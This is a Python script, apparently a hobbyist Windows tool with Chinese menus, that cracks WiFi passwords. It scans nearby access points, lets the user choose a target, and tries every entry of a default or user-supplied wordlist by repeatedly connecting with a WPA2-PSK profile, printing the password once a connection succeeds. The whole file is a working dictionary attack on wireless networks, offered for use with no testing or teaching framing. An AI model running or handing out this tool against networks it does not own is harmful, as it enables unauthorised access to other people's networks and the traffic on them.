from turtle import color
from pywifi import const, PyWiFi ,Profile
from time import sleep
from winsound import Beep # just for Windows
import os
from colorama import Fore as color
import sys

os.system("cls")
print(color.RED+"""

 _    _ _______ _   _____                _    
| |  | (_)  ___(_) /  __ \              | |   
| |  | |_| |_   _  | /  \/_ __ __ _  ___| | __
| |/\| | |  _| | | | |   | '__/ _` |/ __| |/ /
\  /\  / | |   | | | \__/\ | | (_| | (__|   < 
 \/  \/|_\_|   |_|  \____/_|  \__,_|\___|_|\_\ """)
sleep(0.1)
print(color.RED+"""
------------------------------------------------------
|||            作者：BCCB                          |||
|||            联系方式：bccb@bccbbccb.cn          |||               
------------------------------------------------------             
""")
sleep(0.1)
print(color.LIGHTRED_EX+"[1]--使用默认密码本破解WiFi")
sleep(0.1)
print('')
print(color.LIGHTRED_EX+"[2]--使用你的密码本破解WiFi")
sleep(0.1)
print("")
print(color.LIGHTRED_EX+"[3]--关于工具 & 联系我们")
sleep(0.1)
print("")
print("[4]--退出")
sleep(0.1)
print("")

number2 = input("输入数字 >> ")
sleep(0.1)
print("")

if "1" in number2:
    print(color.LIGHTBLUE_EX+"<< 欢迎使用WiFi破解工具 >>")

    def scan(): # For Scan the area
        interface.scan()
        sleep(8)
        result = interface.scan_results()
        return result

    def testwifi(ssid , password):
        interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.connect(interface.add_network_profile(profile))
        sleep(1)
        if interface.status() == const.IFACE_CONNECTED:
            interface.remove_network_profile(profile)
            return True
        else:
            interface.remove_network_profile(profile)
            return False
            

    
    wifi = PyWiFi() # Wifi Object
    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
    #print(color.LIGHTMAGENTA_EX+"< Enter The List Password Name To Crack PassWord >")
    print("")
    print("测试默认密码本")
    sleep(0.1)
    print("")
    #print(color.LIGHTMAGENTA_EX+"<<< Please Enter The List Password File In The Tool Path And Enter Its Name >>>")
    passlist = "passwordlist.txt"  # Password List File 

    print(color.GREEN+"<<扫描中 ... ")
    APs = scan()

    for i in range(len(APs)):
        print("{} - {}".format(i+1 ,APs[i].ssid))

    index = int(input("\n>> "))
    target = APs[index-1]

    for password in open(passlist):
        password = password.strip("\n")
        print(color.RED+"Testing : {}".format(password))
        if testwifi(target.ssid , password) : # Test for connection using password
            Beep(700 , 500) # Boooooghhh (just for windows)
            Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
            print("-" *30)
            print(color.GREEN+"PASSWORD : {}".format(password))
            print("-" *30)
            break

    input()  

elif "2" in number2:
    print(color.LIGHTBLUE_EX+"<< 欢迎使用WiFi破解工具 >>")
    sleep(0.1)
    print("")
    sleep(0.1)
    def scan(): # For Scan the area
        interface.scan()
        sleep(8)
        result = interface.scan_results()
        return result

    def testwifi(ssid , password):
        interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.connect(interface.add_network_profile(profile))
        sleep(1)
        if interface.status() == const.IFACE_CONNECTED:
            interface.remove_network_profile(profile)
            return True
        else:
            interface.remove_network_profile(profile)
            return False
            
    
    wifi = PyWiFi() # Wifi Object
    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
    print(color.LIGHTMAGENTA_EX+"< 输入要破解密码的密码表文件名 >")
    sleep(0.1)
    print("")
    
    print(color.LIGHTMAGENTA_EX+"<<< 请输入工具路径中的密码本文件，并输入其名称 >>>")
    print("")
    sleep(0.1)
    passlist = input(color.LIGHTMAGENTA_EX+"<<输入要破解WiFi的密码列表 : ") # Password List

    print(color.GREEN+"<<扫描中 ... ")
    APs = scan()

    for i in range(len(APs)):
        print("{} - {}".format(i+1 ,APs[i].ssid))

    index = int(input("\n>> "))
    target = APs[index-1]

    for password in open(passlist):
        password = password.strip("\n")
        print(color.RED+"Testing : {}".format(password))
        if testwifi(target.ssid , password) : # Test for connection using password
            Beep(700 , 500) # Boooooghhh (just for windows)
            Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
            print("-" *30)
            print(color.GREEN+"PASSWORD : {}".format(password))
            print("-" *30)
            break
elif "3" in number2:
    print(print(color.RED+"""

                  作者：BCCB
                  联系方式：bccb@bccbbccb.cn
                     
        """)) #About Tools 

else:
    print("感谢使用本工具...")

print("按下任意键退出程序...")
try:
    input()
except SystemExit:
    print("程序正在退出...")
    sys.exit()